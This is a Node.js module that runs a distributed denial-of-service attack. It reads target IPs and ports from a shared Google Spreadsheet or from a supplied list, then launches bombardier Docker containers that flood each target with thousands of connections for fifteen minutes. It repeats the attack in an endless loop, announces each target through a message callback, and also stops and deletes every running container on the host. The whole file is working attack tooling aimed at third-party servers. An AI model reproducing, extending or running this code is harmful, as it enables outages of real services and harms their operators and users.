const { GoogleSpreadsheet } = require("google-spreadsheet");
const Docker = require("dockerode");
const docker = new Docker();

const DOCKER_IMAGE = "alpine/bombardier";
const TARGET_COUNT = process.env.TARGET_COUNT || 3;
const ATTACK_TIME_SECONDS = process.env.ATTACK_TIME_SECONDS || 900;
const ATTACK_CONNECTIONS_COUNT = process.env.ATTACK_CONNECTIONS_COUNT || 7000;
const SUCCESS_SLEEP_SECONDS = process.env.SUCCESS_SLEEP_SECONDS || 30;

const sleep = (ms) => new Promise((res) => setTimeout(res, ms));

class DDOS {
  constructor({ targets = [], sendMessage }) {
    this.targets = targets;
    this.isTargets = false;
    this.doc = new GoogleSpreadsheet(
      "1CGimNXk_8zQoIHoVPC_XvtbIqEt2QiWR4LDtAgzRtmU"
    );
    this.sendMessage = sendMessage;
  }

  cleanRunningDockerContainers = async () => {
    try {
      const containers = await docker.listContainers();
      return Promise.all(
        containers.map(async (containerInfo) => {
          await docker.getContainer(containerInfo.Id).stop();
          await docker.getContainer(containerInfo.Id).remove();
        })
      );
    } catch (err) {
      return err;
    }
  };

  runDocker = (source) => {
    const options = [
      `--duration=${ATTACK_TIME_SECONDS}s`,
      `--connections=${ATTACK_CONNECTIONS_COUNT}`,
      source,
    ];

    return docker
      .run(DOCKER_IMAGE, options, process.stdout)
      .then((data) => {
        var container = data[1];
        return container.remove();
      })
      .then(() => {
        console.log("container removed");
      })
      .catch((err) => {
        console.log("runDocker error", err);
      });
  };

  async ddos({ count = 1 } = {}) {
    const _count = count;
    console.log(`DDOS ${_count} stared!`);

    const actions = [];

    try {
      if (this.targets.length) {
        this.isTargets = true;
        this.sendMessage("DDOS from targets");
        console.log("DDOS from targets");
        for (let i = 0; i < TARGET_COUNT; i++) {
          const target = this.targets.pop();
          this.sendMessage(`DDOS => ${target}`);
          console.log(`DDOS => ${target}`);
          actions.push(this.runDocker(target));
        }
      } else {
        this.isTargets = false;
        this.sendMessage("DDOS from GoogleSpreadsheet");
        console.log("DDOS from GoogleSpreadsheet");

        // https://theoephraim.github.io/node-google-spreadsheet/#/getting-started/authentication
        await this.doc.useServiceAccountAuth({
          client_email: process.env.CLIENT_EMAIL,
          private_key: process.env.PRIVATE_KEY,
        });
        await this.doc.loadInfo();

        const sheet = this.doc.sheetsByIndex[5];
        const rows = await sheet.getRows({ limit: 20 });

        const randomRows = rows
          .sort(() => Math.random() - 0.5)
          .slice(0, TARGET_COUNT);

        for (let i = 0; i < randomRows.length; i++) {
          const { IP, PORT, DESCRIPTION } = randomRows[i];
          this.sendMessage(`DDOS => ${IP}:${PORT} (${DESCRIPTION})`);
          console.log(`DDOS => ${IP}:${PORT} (${DESCRIPTION})`);
          actions.push(this.runDocker(`${IP}:${PORT}`));
        }
      }
    } catch (err) {
      console.log("err", err);
    }

    await Promise.all(actions);
    console.log(`DDOS ${_count} done!`);
    this.ddos({ count: _count + 1 });
    // setTimeout(() => {
    //   console.log(`DDOS ${_count} done! Sleep ${SUCCESS_SLEEP_SECONDS} sec`);
    //   this.ddos({ count: _count + 1 });
    // }, (ATTACK_TIME_SECONDS + SUCCESS_SLEEP_SECONDS) * 1000);

    // await sleep((ATTACK_TIME_SECONDS + SUCCESS_SLEEP_SECONDS) * 1000);
    // // await sleep(SUCCESS_SLEEP_SECONDS * 1000);

    // console.log(`DDOS ${_count} done! Sleep ${SUCCESS_SLEEP_SECONDS} sec`);

    // return this.ddos({ count: _count + 1 });
  }

  addTargets(targets) {
    const newTargets = [...new Set([...this.targets, ...targets])];
    this.targets = newTargets;
  }
  clearTargets() {
    this.targets = [];
  }

  async getRunnigContainers() {
    return docker.listContainers();
  }

  async run() {
    await this.cleanRunningDockerContainers();
    this.ddos();
  }
}

module.exports = DDOS;
